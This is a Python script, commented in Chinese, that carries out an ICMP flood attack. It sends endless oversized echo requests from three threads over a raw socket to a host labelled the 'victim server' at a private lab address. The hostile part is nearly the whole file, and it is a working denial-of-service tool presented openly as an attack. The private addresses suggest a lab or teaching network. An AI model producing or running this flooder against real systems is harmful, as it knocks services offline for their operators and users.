import socket
import random
import threading
import struct

# 目标主机：h1（受害者服务器）
TARGET_IP = "192.168.1.100"
THREAD_COUNT = 3  # 攻击线程数量
PACKET_SIZE = 1024  # 每个ICMP包的大小（字节）

def icmp_checksum(data):
    """计算ICMP包的校验和"""
    checksum = 0
    data_len = len(data)
    if data_len % 2 != 0:
        data_len += 1
        data += b"\x00"
    
    for i in range(0, data_len, 2):
        w = (data[i] << 8) + (data[i+1])
        checksum += w
    
    checksum = (checksum >> 16) + (checksum & 0xffff)
    checksum += checksum >> 16
    return ~checksum & 0xffff

def icmp_flood():
    """发送大量ICMP Echo请求（Ping包），造成ICMP Flood攻击"""
    try:
        # 创建ICMP socket（需要root权限）
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("❌ 请使用root权限运行脚本：sudo python3 icmp_flood.py")
        return

    # 使用h5的真实IP地址 (192.168.1.104)
    src_ip = "192.168.1.104"
    
    while True:
        # 构造ICMP头部（类型8：Echo请求）
        icmp_type = 8  # Echo Request
        icmp_code = 0
        icmp_id = random.randint(1, 65535)
        icmp_seq = random.randint(1, 65535)
        
        # 构造ICMP数据部分
        payload = random._urandom(PACKET_SIZE)
        
        # 组装ICMP包并计算校验和
        icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, 0, icmp_id, icmp_seq)
        checksum = icmp_checksum(icmp_header + payload)
        icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
        icmp_packet = icmp_header + payload
        
        # 发送ICMP包
        sock.sendto(icmp_packet, (TARGET_IP, 0))
        # 每发送500个包打印一次状态
        if random.randint(1, 500) == 250:
            print(f"📊 已发送大量Ping包：{src_ip} → {TARGET_IP}")

if __name__ == "__main__":
    print(f"🚀 开始ICMP Flood攻击，目标：{TARGET_IP}")
    print(f"ℹ️  按Ctrl+C停止攻击")
    
    # 启动多线程攻击
    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=icmp_flood)
        thread.daemon = True
        thread.start()
    
    # 保持主线程运行
    try:
        while True:
            threading.Event().wait(1)
    except KeyboardInterrupt:
        print("\n🛑 攻击已停止")

